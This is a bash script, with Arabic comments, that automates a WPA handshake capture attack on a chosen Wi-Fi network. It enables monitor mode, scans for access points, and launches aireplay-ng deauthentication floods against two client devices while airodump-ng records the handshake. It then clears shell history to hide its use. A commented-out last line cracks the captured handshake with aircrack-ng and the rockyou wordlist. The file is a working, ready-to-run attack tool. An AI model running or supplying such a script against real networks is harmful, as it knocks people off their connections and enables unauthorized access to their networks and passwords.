#!/bin/bash

CURRENT_DATETIME=$(date +"%Y-%m-%d_%H:%M:%S")
# تعريف الألوان
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # إعادة اللون إلى الافتراضي


read -s -p "Enter your sudo password: " PASSWORD
sleep 1
echo
# فاصل زخرفي
SEPARATOR="${CYAN}──────────────────────────────────────────${NC}"

echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Change Directory to Other${NC}"
echo -e "$SEPARATOR"

cd /mnt/hdd/HS/
sleep 1
pwd
sleep 1

echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Checking USB Devices...${NC}"
echo -e "$SEPARATOR"
lsusb
sleep 1

echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Checking Wireless Configuration...${NC}"
echo -e "$SEPARATOR"
iwconfig
sleep 1

echo -e "$SEPARATOR"
echo -e "${YELLOW}[INFO] Enabling Monitor Mode on wlan0...${NC}"
echo -e "$SEPARATOR"
sudo airmon-ng start wlan0
sleep 1
echo -e "$SEPARATOR"
echo -e "${RED}[WARNING] Killing Conflicting Processes...${NC}"
echo -e "$SEPARATOR"
sudo airmon-ng check kill
sleep 1
echo -e "$SEPARATOR"
echo -e "${WHITE}[INFO] Verifying Wireless Configuration...${NC}"
echo -e "$SEPARATOR"
iwconfig
sleep 1

# إزالة جهاز USB معين
echo -e "$SEPARATOR"
echo "[INFO] Removing USB Device..."
echo -e "$SEPARATOR"
echo "$PASSWORD" | sudo -S bash -c "echo '1' > /sys/bus/usb/devices/1-1/remove"
echo
sleep 1
echo -e "$SEPARATOR"
lsusb
echo -e "$SEPARATOR"
sleep 1
# إلغاء تحميل برنامج تشغيل وحدة تحكم الـ PCI
echo -e "$SEPARATOR"
echo "[INFO] Unbinding PCI Device..."
echo -e "$SEPARATOR"

echo -n "0000:00:0b.0" | sudo tee /sys/bus/pci/drivers/ehci-pci/unbind
sleep 1
echo
echo -e "$SEPARATOR"
lsusb
echo -e "$SEPARATOR"
sleep 1
# إعادة تحميل برنامج تشغيل وحدة تحكم الـ PCI
echo -e "$SEPARATOR"
echo "[INFO] Binding PCI Device..."
echo -e "$SEPARATOR"
echo -n "0000:00:0b.0" | sudo tee /sys/bus/pci/drivers/ehci-pci/bind
sleep 1
echo
echo -e "$SEPARATOR"
lsusb
echo -e "$SEPARATOR"
sleep 1

echo -e "$SEPARATOR"
echo -e "${GREEN}[INFO] Running Airodump-ng for 60 seconds...${NC}"
echo -e "$SEPARATOR"
sudo timeout 1m airodump-ng wlan0 -w scan --output-format csv 
echo -e "${GREEN}[INFO] Airodump-ng process finished, continuing...${NC}"
sleep 1
echo -e "$SEPARATOR"




read -p "$(echo -e ${BLUE}[INFO] Enter The MAC of Target : ${NC})" target_bssid

channel=$(awk -F, -v bssid="$target_bssid" '$1 == bssid {print $4}' scan-01.csv)

rm -rf scan*
echo -e "$SEPARATOR"
echo -e "${CYAN}[INFO] Running targeted Airodump-ng...${NC}"
echo -e "$SEPARATOR"
sudo timeout 1m airodump-ng wlan0 --bssid $target_bssid --channel $channel 
sleep 1
echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Change Directory To '$target_bssid' ${NC}"
echo -e "$SEPARATOR"
pwd
sleep 1
mkdir -p "$target_bssid" && cd "$target_bssid"
sleep 1
pwd
echo -e "$SEPARATOR"
sleep 1
echo -e "$SEPARATOR"
read -p "$(echo -e ${BLUE}[INFO] Enter The MAC OF Client 1: ${NC})" client1
read -p "$(echo -e ${BLUE}[INFO] Enter The MAC OF Client 2: ${NC})" client2
sleep 1
echo -e "$SEPARATOR"
echo -e "${GREEN}[INFO] Starting aireplay-ng attacks...${NC}"
echo -e "$SEPARATOR"
xterm -geometry 80x24+0+0 -e "echo "$PASSWORD" | sudo -S timeout 2m airodump-ng wlan0 --bssid $target_bssid --channel $channel --write "${target_bssid}_${CURRENT_DATETIME}" --output-format cap,csv; exit;" &
sleep 1
xterm -geometry 80x12+960+0 -e "sleep 17; sudo aireplay-ng -0 30 -a $target_bssid -c $client1 wlan0; exit;" &
sleep 1
xterm -geometry 80x24+960+540 -e "sleep 55; sudo aireplay-ng -0 30 -a $target_bssid -c $client2 wlan0; exit;"
sleep 1
echo -e "$SEPARATOR"
echo -e "${YELLOW}[WARNING] Stopping Monitor Mode...${NC}"
echo -e "$SEPARATOR"
sudo airmon-ng stop wlan0
sleep 1
echo -e "$SEPARATOR"
echo -e "${BLUE}[INFO] Verifying Wireless Configuration...${NC}"
echo -e "$SEPARATOR"
iwconfig
sleep 1
echo -e "$SEPARATOR"
echo -e "${RED}[WARNING] Restarting Network Services...${NC}"
echo -e "$SEPARATOR"
sudo systemctl start wpa_supplicant
sleep 1
sudo systemctl start NetworkManager
sleep 1
echo -e "$SEPARATOR"

# مسح الكاش والذاكرة المؤقتة
echo "$PASSWORD" | sudo -S sync && sudo sysctl -w vm.drop_caches=3

# مسح السجل والبيانات الحساسة
history -c
history -w
unset PASSWORD
unset target_bssid
unset channel
unset client1
unset client2
unset CURRENT_DATETIME

# قتل العمليات العالقة
sudo pkill -f airodump-ng
sudo pkill -f aireplay-ng
sudo pkill -f xterm
echo -e "${GREEN}[INFO] Cleanup completed successfully! ${NC}"
echo -e "$SEPARATOR"
sleep 1
echo -e "$SEPARATOR"
echo -e "${GREEN}[INFO] Process Completed Successfully!${NC}"
echo -e "$SEPARATOR"
sleep 1
#sudo aircrack-ng -w '/mnt/hdd/Wordlists/Passwds/rockyou.txt'  ${bssid}_${CURRENT_DATETIME}-01.cap  -p 1 

